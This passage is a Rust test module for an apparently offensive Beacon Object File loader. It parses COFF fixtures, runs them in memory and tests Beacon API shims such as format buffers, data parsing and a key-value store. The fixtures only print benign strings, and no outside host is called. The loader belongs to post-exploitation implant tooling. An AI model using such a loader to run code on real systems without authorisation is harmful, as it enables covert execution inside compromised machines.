    fn parses_amd64_fixture() {
        let coff = parse(AMD64_BOF).expect("parse");
        assert_eq!(coff.machine, IMAGE_FILE_MACHINE_AMD64);
        assert!(coff.symbols.iter().any(|symbol| symbol.name == "go"));
        assert!(coff
            .symbols
            .iter()
            .any(|symbol| symbol.name == "__imp_BeaconOutput"));
        let text = coff
            .sections
            .iter()
            .find(|section| section.name == ".text")
            .expect(".text");
        assert!(text.characteristics & IMAGE_SCN_MEM_EXECUTE != 0);
        assert!(!text.relocations.is_empty());
    }

    #[test]
    fn parses_arm64_fixture() {
        let coff = parse(ARM64_BOF).expect("parse");
        assert_eq!(coff.machine, IMAGE_FILE_MACHINE_ARM64);
        assert!(coff.symbols.iter().any(|symbol| symbol.name == "go"));
    }

    #[test]
    fn rejects_unknown_machine() {
        let mut bytes = AMD64_BOF.to_vec();
        bytes[0] = 0x00;
        bytes[1] = 0x00;
        assert!(parse(&bytes).is_err());
    }

    #[test]
    fn unresolved_import_is_reported() {
        let mut bytes = AMD64_BOF.to_vec();
        // Rename `__imp_BeaconOutput` to an import the host does not
        // provide. The replacement keeps the string-table entry length.
        let needle = b"__imp_BeaconOutput\0";
        let offset = bytes
            .windows(needle.len())
            .position(|window| window == needle)
            .expect("fixture references __imp_BeaconOutput");
        bytes[offset..offset + 18].copy_from_slice(b"__imp_NoSuchExport");

        // On x86-64 hosts execution reaches import resolution and must
        // fail; on other hosts the machine check fires first.
        let error = execute(&bytes, b"").expect_err("unknown imports must fail");
        assert!(
            error.contains("unresolved") || error.contains("does not match host"),
            "unexpected error: {error}"
        );
    }

    #[cfg(all(unix, target_arch = "aarch64"))]
    #[test]
    fn executes_arm64_bof_on_host() {
        let outcome = execute(ARM64_BOF, b"").expect("execute");
        assert_eq!(outcome.exit_code, 0);
        let output = String::from_utf8_lossy(&outcome.output);
        assert!(
            output.contains("arm-bof-ok"),
            "unexpected output: {output:?}"
        );
    }

    #[cfg(all(windows, target_arch = "x86_64"))]
    #[test]
    fn executes_amd64_bof_on_host() {
        let outcome = execute(AMD64_BOF, b"hello").expect("execute");
        assert_eq!(outcome.exit_code, 0);
        let output = String::from_utf8_lossy(&outcome.output);
        assert!(output.contains("[+] bof says hello"), "output: {output:?}");
        assert!(output.contains("hello"), "output: {output:?}");
    }

    #[cfg(not(any(
        all(unix, target_arch = "aarch64"),
        all(windows, target_arch = "x86_64")
    )))]
    #[test]
    fn machine_mismatch_is_rejected() {
        assert!(execute(AMD64_BOF, b"").is_err() || execute(ARM64_BOF, b"").is_err());
    }

    #[test]
    fn format_builder_round_trip() {
        unsafe {
            let mut format = BeaconFormat {
                original: std::ptr::null_mut(),
                buffer: std::ptr::null_mut(),
                length: 0,
                size: 0,
            };
            beacon_format_alloc(&mut format, 4);
            beacon_format_int(&mut format, 0x0102_0304);
            beacon_format_short(&mut format, 0x0506);
            let payload = b"abc";
            assert_eq!(beacon_format_append(&mut format, payload.as_ptr(), 3), 1);
            assert_eq!(beacon_format_length(&mut format), 9);
            let mut size = 0i32;
            let pointer = beacon_format_tostring(&mut format, &mut size);
            assert_eq!(size, 9);
            let built = std::slice::from_raw_parts(pointer, size as usize);
            assert_eq!(&built[0..4], &[1, 2, 3, 4]);
            assert_eq!(&built[4..6], &[5, 6]);
            assert_eq!(&built[6..9], b"abc");
            beacon_format_reset(&mut format);
            assert_eq!(beacon_format_length(&mut format), 0);
            beacon_format_free(&mut format);
            assert!(format.original.is_null());
        }
    }

    #[test]
    fn wide_char_conversion() {
        let source = b"hi\0";
        let mut dest = [0u16; 8];
        let written = unsafe { beacon_to_wide_char(dest.as_mut_ptr(), source.as_ptr(), 8) };
        assert_eq!(written, 2);
        assert_eq!(&dest[0..3], &[b'h' as u16, b'i' as u16, 0]);
    }

    #[test]
    fn datastore_round_trip() {
        let key = b"shikra-test-key\0";
        let value = 0x1234usize as *mut std::ffi::c_void;
        unsafe {
            assert_eq!(beacon_add_value(key.as_ptr(), value), 1);
            assert_eq!(beacon_get_value(key.as_ptr()), value);
            assert_eq!(beacon_remove_value(key.as_ptr()), 1);
            assert!(beacon_get_value(key.as_ptr()).is_null());
        }
    }

    #[test]
    fn data_parser_reads_big_endian() {
        // int(7) | short(5) | length(5) | "xyzwq"
        let mut buffer = [
            0u8, 0, 0, 7, 0x00, 0x05, 0, 0, 0, 5, b'x', b'y', b'z', b'w', b'q',
        ];
        let mut parser = BeaconDataParser {
            original: std::ptr::null_mut(),
            buffer: std::ptr::null_mut(),
            length: 0,
            size: 0,
        };
        unsafe {
            beacon_data_parse(&mut parser, buffer.as_mut_ptr(), buffer.len() as i32);
            assert_eq!(beacon_data_int(&mut parser), 7);
            assert_eq!(beacon_data_short(&mut parser), 5);
            let mut size = 0i32;
            let extracted = beacon_data_extract(&mut parser, &mut size);
            assert_eq!(size, 5);
            assert_eq!(
                std::slice::from_raw_parts(extracted, size as usize),
                b"xyzwq"
            );
        }
    }
}
